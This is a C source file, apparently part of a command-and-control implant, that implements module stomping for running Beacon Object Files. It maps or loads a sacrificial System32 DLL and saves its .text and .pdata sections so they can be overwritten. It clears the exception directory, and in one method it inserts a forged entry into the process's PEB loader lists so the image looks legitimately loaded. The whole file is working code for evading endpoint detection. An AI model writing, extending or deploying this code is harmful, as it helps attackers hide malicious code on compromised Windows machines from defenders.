#include "bof_stomp.h"
#include "utils.h"

#ifndef SEC_IMAGE
#define SEC_IMAGE 0x01000000
#endif
#ifndef SECTION_MAP_EXECUTE
#define SECTION_MAP_EXECUTE  0x0008
#define SECTION_MAP_READ     0x0004
#define SECTION_MAP_WRITE    0x0002
#define SECTION_QUERY        0x0001
#endif
#ifndef FILE_SHARE_DELETE
#define FILE_SHARE_DELETE 0x00000004
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// ---------------------------------------------------------------------------
// Method 1 helpers — fake PEB LDR entry
// ---------------------------------------------------------------------------

#if defined(BOF_STOMP_METHOD) && BOF_STOMP_METHOD == 1

static SIZE_T _wstrlen(const WCHAR* s) { SIZE_T n = 0; while (s[n]) n++; return n; }

#define FAKE_LDR_FULL_WCHARS  512
#define FAKE_LDR_BASE_WCHARS  128
#define FAKE_LDR_BLOCK_BYTES  ((DWORD)(sizeof(LDR_DATA_TABLE_ENTRY) \
                               + FAKE_LDR_FULL_WCHARS * sizeof(WCHAR) \
                               + FAKE_LDR_BASE_WCHARS * sizeof(WCHAR)))

static PLDR_DATA_TABLE_ENTRY InsertFakePebLdrEntry(PVOID viewBase, const char* dllName)
{
    PPEB pPeb;
#if defined(__x86_64__) || defined(_WIN64)
    pPeb = (PPEB)__readgsqword(0x60);
#else
    pPeb = (PPEB)__readfsdword(0x30);
#endif
    if (!pPeb || !pPeb->Ldr) return NULL;

    PPEB_LDR_DATA     pLdr = pPeb->Ldr;
    PIMAGE_DOS_HEADER dos  = (PIMAGE_DOS_HEADER)viewBase;
    PIMAGE_NT_HEADERS nt   = (PIMAGE_NT_HEADERS)((ULONG_PTR)viewBase + dos->e_lfanew);

    BYTE* block = (BYTE*)MemAllocLocal(FAKE_LDR_BLOCK_BYTES);
    if (!block) return NULL;

    PLDR_DATA_TABLE_ENTRY entry   = (PLDR_DATA_TABLE_ENTRY)(PVOID)block;
    WCHAR*                fullBuf = (WCHAR*)(block + sizeof(LDR_DATA_TABLE_ENTRY));
    WCHAR*                baseBuf = fullBuf + FAKE_LDR_FULL_WCHARS;

    const WCHAR sysPrefix[] = L"C:\\Windows\\System32\\";
    int fpos = 0;
    for (int i = 0; sysPrefix[i] && fpos < FAKE_LDR_FULL_WCHARS - 1; i++)
        fullBuf[fpos++] = sysPrefix[i];
    for (int i = 0; dllName[i] && fpos < FAKE_LDR_FULL_WCHARS - 1; i++)
        fullBuf[fpos++] = (WCHAR)dllName[i];

    int bpos = 0;
    for (int i = 0; dllName[i] && bpos < FAKE_LDR_BASE_WCHARS - 1; i++)
        baseBuf[bpos++] = (WCHAR)dllName[i];

    entry->DllBase       = viewBase;
    entry->EntryPoint    = (PVOID)((ULONG_PTR)viewBase + nt->OptionalHeader.AddressOfEntryPoint);
    entry->SizeOfImage   = nt->OptionalHeader.SizeOfImage;
    entry->OriginalBase  = (ULONG_PTR)nt->OptionalHeader.ImageBase;
    entry->TimeDateStamp = nt->FileHeader.TimeDateStamp;
    entry->Flags         = LDRP_IMAGE_DLL | LDRP_ENTRY_PROCESSED;
    entry->LoadCount     = 1;

    entry->FullDllName.Buffer        = fullBuf;
    entry->FullDllName.Length        = (USHORT)(fpos * sizeof(WCHAR));
    entry->FullDllName.MaximumLength = (USHORT)((fpos + 1) * sizeof(WCHAR));

    entry->BaseDllName.Buffer        = baseBuf;
    entry->BaseDllName.Length        = (USHORT)(bpos * sizeof(WCHAR));
    entry->BaseDllName.MaximumLength = (USHORT)((bpos + 1) * sizeof(WCHAR));

    PLIST_ENTRY loadTail              = pLdr->InLoadOrderModuleList.Blink;
    entry->InLoadOrderLinks.Flink     = &pLdr->InLoadOrderModuleList;
    entry->InLoadOrderLinks.Blink     = loadTail;
    loadTail->Flink                   = &entry->InLoadOrderLinks;
    pLdr->InLoadOrderModuleList.Blink = &entry->InLoadOrderLinks;

    PLIST_ENTRY memTail                 = pLdr->InMemoryOrderModuleList.Blink;
    entry->InMemoryOrderLinks.Flink     = &pLdr->InMemoryOrderModuleList;
    entry->InMemoryOrderLinks.Blink     = memTail;
    memTail->Flink                      = &entry->InMemoryOrderLinks;
    pLdr->InMemoryOrderModuleList.Blink = &entry->InMemoryOrderLinks;

    return entry;
}

static void RemoveFakePebLdrEntry(PLDR_DATA_TABLE_ENTRY entry)
{
    if (!entry) return;
    entry->InLoadOrderLinks.Blink->Flink   = entry->InLoadOrderLinks.Flink;
    entry->InLoadOrderLinks.Flink->Blink   = entry->InLoadOrderLinks.Blink;
    entry->InMemoryOrderLinks.Blink->Flink = entry->InMemoryOrderLinks.Flink;
    entry->InMemoryOrderLinks.Flink->Blink = entry->InMemoryOrderLinks.Blink;
    LPVOID ptr = entry;
    MemFreeLocal(&ptr, FAKE_LDR_BLOCK_BYTES);
}

#endif // BOF_STOMP_METHOD == 1

// ---------------------------------------------------------------------------
// Internal: find .text section inside a mapped PE image
// ---------------------------------------------------------------------------

static BOOL FindTextSection(PVOID base, PVOID* outTextBase, SIZE_T* outTextSize)
{
    PIMAGE_DOS_HEADER     dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS     nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if ((*(DWORD*)sec->Name | 0x20202020) == 'xet.') {
            *outTextBase = (PVOID)((ULONG_PTR)base + sec->VirtualAddress);
            *outTextSize = sec->Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

// ---------------------------------------------------------------------------
// Method 0 — LoadLibraryEx(DONT_RESOLVE_DLL_REFERENCES)
// ---------------------------------------------------------------------------

#if !defined(BOF_STOMP_METHOD) || BOF_STOMP_METHOD == 0

static BOF_STOMP_CTX* CreateBofStompLoadLibrary(const char* sacrificialDll)
{
    HMODULE hMod = ApiWin->LoadLibraryExA((LPCSTR)sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hMod)
        return NULL;

    PVOID  textBase = NULL;
    SIZE_T textSize = 0;
    if (!FindTextSection((PVOID)hMod, &textBase, &textSize)) {
        ApiWin->FreeLibrary(hMod);
        return NULL;
    }

    PVOID saved = MemAllocLocal((DWORD)textSize);
    if (!saved) {
        ApiWin->FreeLibrary(hMod);
        return NULL;
    }
    memcpy(saved, textBase, textSize);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)hMod + dos->e_lfanew);

    PVOID pdataBase = NULL;
    DWORD pdataSize = 0;
    PVOID savedPdata = NULL;
    {
        PIMAGE_DATA_DIRECTORY excDir =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (excDir->VirtualAddress && excDir->Size) {
            pdataBase = (PVOID)((ULONG_PTR)hMod + excDir->VirtualAddress);
            pdataSize = excDir->Size;
            savedPdata = MemAllocLocal(pdataSize);
            if (!savedPdata) {
                LPVOID savedPtr = saved;
                MemFreeLocal(&savedPtr, (DWORD)textSize);
                ApiWin->FreeLibrary(hMod);
                return NULL;
            }
            memcpy(savedPdata, pdataBase, pdataSize);
        }
    }

    BOF_STOMP_CTX* ctx = (BOF_STOMP_CTX*)MemAllocLocal(sizeof(BOF_STOMP_CTX));
    if (!ctx) {
        if (savedPdata) {
            LPVOID sp = savedPdata;
            MemFreeLocal(&sp, pdataSize);
        }
        LPVOID sv = saved;
        MemFreeLocal(&sv, (DWORD)textSize);
        ApiWin->FreeLibrary(hMod);
        return NULL;
    }
    memset(ctx, 0, sizeof(BOF_STOMP_CTX));

    ctx->hModule       = hMod;
    ctx->mappedView    = NULL;
    ctx->viewSize      = 0;
    ctx->method        = 0;
    ctx->textBase      = textBase;
    ctx->textSize      = textSize;
    ctx->savedBytes    = saved;
    ctx->savedSize     = (DWORD)textSize;
    ctx->pdataBase     = pdataBase;
    ctx->pdataSize     = pdataSize;
    ctx->savedPdata    = savedPdata;
    ctx->pdataCapacity = pdataSize ? (pdataSize / (sizeof(DWORD) * 3)) : 0;
    ctx->moduleBase    = (PVOID)hMod;
    ctx->pdataStomped  = FALSE;
    ctx->cursorBase    = NULL;
    ctx->cursorSize    = 0;
    ctx->inUse         = FALSE;
    ctx->initialised   = TRUE;
    ctx->fakeLdrEntry  = NULL;

    return ctx;
}

#endif // Method 0

// ---------------------------------------------------------------------------
// Method 1 — NtCreateSection + NtMapViewOfSection
// ---------------------------------------------------------------------------

#if defined(BOF_STOMP_METHOD) && BOF_STOMP_METHOD == 1

static BOF_STOMP_CTX* CreateBofStompNtSection(const char* sacrificialDll)
{
    WCHAR ntPath[512];
    {
        const WCHAR prefix[] = L"\\??\\C:\\Windows\\System32\\";
        int wpos = 0;
        for (int i = 0; prefix[i] && wpos < 490; i++)
            ntPath[wpos++] = prefix[i];
        for (int i = 0; sacrificialDll[i] && wpos < 510; i++)
            ntPath[wpos++] = (WCHAR)sacrificialDll[i];
        ntPath[wpos] = L'\0';
    }

    UNICODE_STRING uPath;
    uPath.Buffer        = ntPath;
    uPath.Length        = (USHORT)(_wstrlen(ntPath) * sizeof(WCHAR));
    uPath.MaximumLength = uPath.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK ioStatus = { 0 };
    HANDLE hFile = NULL;

    NTSTATUS status = ApiNt->NtOpenFile(
        &hFile,
        0x001000A1,
        &objAttr,
        &ioStatus,
        0x00000005,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
    );
    if (!NT_SUCCESS(status) || !hFile)
        return NULL;

    HANDLE hSection = NULL;
    status = ApiNt->NtCreateSection(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );
    ApiNt->NtClose(hFile);

    if (!NT_SUCCESS(status) || !hSection)
        return NULL;

    PVOID  viewBase = NULL;
    SIZE_T viewSize = 0;
    status = ApiNt->NtMapViewOfSection(
        hSection,
        (HANDLE)(LONG_PTR)-1,
        &viewBase,
        0, 0, NULL, &viewSize,
        ViewShare,
        0,
        PAGE_READONLY
    );
    ApiNt->NtClose(hSection);

    if (!NT_SUCCESS(status) || !viewBase)
        return NULL;

    PVOID  textBase = NULL;
    SIZE_T textSize = 0;
    if (!FindTextSection(viewBase, &textBase, &textSize)) {
        ApiNt->NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, viewBase);
        return NULL;
    }

    PVOID saved = MemAllocLocal((DWORD)textSize);
    if (!saved) {
        ApiNt->NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, viewBase);
        return NULL;
    }
    memcpy(saved, textBase, textSize);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)viewBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)viewBase + dos->e_lfanew);

    PVOID pdataBase  = NULL;
    DWORD pdataSize  = 0;
    PVOID savedPdata = NULL;
    {
        PIMAGE_DATA_DIRECTORY excDir =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (excDir->VirtualAddress && excDir->Size) {
            pdataBase = (PVOID)((ULONG_PTR)viewBase + excDir->VirtualAddress);
            pdataSize = excDir->Size;
        }
        // Zero the data-directory entry so the unwinder falls through
        // to our RtlAddFunctionTable dynamic entries.
        DWORD hdProt = 0;
        if (ApiWin->VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), PAGE_READWRITE, &hdProt)) {
            excDir->VirtualAddress = 0;
            excDir->Size           = 0;
            ApiWin->VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), hdProt, &hdProt);
        }
    }

    if (pdataBase && pdataSize) {
        savedPdata = MemAllocLocal(pdataSize);
        if (savedPdata) {
            memcpy(savedPdata, pdataBase, pdataSize);
            DWORD pdataProt = 0;
            ApiWin->VirtualProtect(pdataBase, pdataSize, PAGE_READWRITE, &pdataProt);
            memset(pdataBase, 0, pdataSize);
            ApiWin->VirtualProtect(pdataBase, pdataSize, pdataProt, &pdataProt);
        }
    }

    BOF_STOMP_CTX* ctx = (BOF_STOMP_CTX*)MemAllocLocal(sizeof(BOF_STOMP_CTX));
    if (!ctx) {
        if (savedPdata) {
            LPVOID sp = savedPdata;
            MemFreeLocal(&sp, pdataSize);
        }
        LPVOID sv = saved;
        MemFreeLocal(&sv, (DWORD)textSize);
        ApiNt->NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, viewBase);
        return NULL;
    }
    memset(ctx, 0, sizeof(BOF_STOMP_CTX));

    ctx->hModule       = NULL;
    ctx->mappedView    = viewBase;
    ctx->viewSize      = viewSize;
    ctx->method        = 1;
    ctx->textBase      = textBase;
    ctx->textSize      = textSize;
    ctx->savedBytes    = saved;
    ctx->savedSize     = (DWORD)textSize;
    ctx->pdataBase     = pdataBase;
    ctx->pdataSize     = pdataSize;
    ctx->savedPdata    = savedPdata;
    ctx->pdataCapacity = pdataSize ? (pdataSize / (sizeof(DWORD) * 3)) : 0;
    ctx->moduleBase    = viewBase;
    ctx->pdataStomped  = FALSE;
    ctx->cursorBase    = NULL;
    ctx->cursorSize    = 0;
    ctx->inUse         = FALSE;
    ctx->initialised   = TRUE;
    ctx->fakeLdrEntry  = (PVOID)InsertFakePebLdrEntry(viewBase, sacrificialDll);

    return ctx;
}

#endif // Method 1

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

BOF_STOMP_CTX* BofStompCreate(const char* sacrificialDll, int method)
{
    (void)method;
#if defined(BOF_STOMP_METHOD) && BOF_STOMP_METHOD == 1
    return CreateBofStompNtSection(sacrificialDll);
#else
    return CreateBofStompLoadLibrary(sacrificialDll);
#endif
}

void BofStompDestroy(BOF_STOMP_CTX* ctx)
{
    if (!ctx)
        return;

    if (!ctx->initialised) {
        LPVOID p = ctx;
        MemFreeLocal(&p, sizeof(BOF_STOMP_CTX));
        return;
    }

    // Restore .pdata if it was stomped and not yet restored by CleanupSections
    if (ctx->pdataStomped && ctx->savedPdata && ctx->pdataBase && ctx->pdataSize) {
        DWORD oldProt = 0;
        if (ApiWin->VirtualProtect(ctx->pdataBase, ctx->pdataSize, PAGE_READWRITE, &oldProt)) {
            memcpy(ctx->pdataBase, ctx->savedPdata, ctx->pdataSize);
            DWORD tmp = 0;
            ApiWin->VirtualProtect(ctx->pdataBase, ctx->pdataSize, oldProt, &tmp);
        }
        ctx->pdataStomped = FALSE;
    }

    // Restore .text if it was stomped and not yet restored
    if (ctx->inUse && ctx->cursorBase && ctx->savedBytes && ctx->cursorSize) {
        DWORD oldProt = 0;
        ApiWin->VirtualProtect(ctx->cursorBase, ctx->cursorSize, PAGE_EXECUTE_READWRITE, &oldProt);
        memset(ctx->cursorBase, 0, ctx->cursorSize);
        memcpy(ctx->cursorBase, ctx->savedBytes, ctx->cursorSize);
        ApiWin->VirtualProtect(ctx->cursorBase, ctx->cursorSize, PAGE_EXECUTE_READ, &oldProt);
    }

    // Free saved copies
    if (ctx->savedBytes) {
        LPVOID p = ctx->savedBytes;
        MemFreeLocal(&p, ctx->savedSize);
        ctx->savedBytes = NULL;
    }
    if (ctx->savedPdata) {
        LPVOID p = ctx->savedPdata;
        MemFreeLocal(&p, ctx->pdataSize);
        ctx->savedPdata = NULL;
    }

#if defined(BOF_STOMP_METHOD) && BOF_STOMP_METHOD == 1
    // Remove the fake PEB LDR entry before unmapping
    if (ctx->fakeLdrEntry) {
        RemoveFakePebLdrEntry((PLDR_DATA_TABLE_ENTRY)ctx->fakeLdrEntry);
        ctx->fakeLdrEntry = NULL;
    }
    if (ctx->mappedView) {
        ApiNt->NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, ctx->mappedView);
        ctx->mappedView = NULL;
    }
#else
    if (ctx->hModule) {
        ApiWin->FreeLibrary(ctx->hModule);
        ctx->hModule = NULL;
    }
#endif

    LPVOID p = ctx;
    MemFreeLocal(&p, sizeof(BOF_STOMP_CTX));
}
